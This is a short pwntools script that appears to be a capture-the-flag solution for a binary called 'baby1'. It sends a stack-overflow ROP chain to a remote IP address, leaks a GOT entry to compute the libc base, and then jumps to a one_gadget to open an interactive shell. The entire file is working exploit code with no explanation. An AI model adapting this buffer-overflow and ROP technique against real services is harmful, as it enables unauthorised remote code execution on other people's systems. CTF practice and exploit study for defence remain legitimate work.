from pwn import *
context.log_level='debug'
read=0x4004c0
write=0x0000000004004B0
got=0x000000000601020
w_got=0x000000000601018
rdi=0x00000000004006c3
rsi_=0x00000000004006c1
main=0x4005f6
gene=0x0000000004006BA
do_call=0x0000000004006A0

def G(rdi,rsi,rdx,call,rbx=0,rbp=1):
	return p64(gene)+p64(rbx)+p64(1)+p64(call)+p64(rdx)+p64(rsi)+p64(rdi)
#p=process("./baby1")
p=remote("51.254.114.246",1111)
payload="A"*56+G(1,got,0x8,w_got)+p64(do_call)+p64(main)*10
p.sendlineafter("Quals!\n",payload)
base=u64(p.read(8))-(0x7f142a152250-0x00007f142a05b000)
log.warning(hex(base))
one=0x4526a
payload="\x00"*56+p64(one+base)
p.sendlineafter("Quals!\n",payload)
p.interactive()
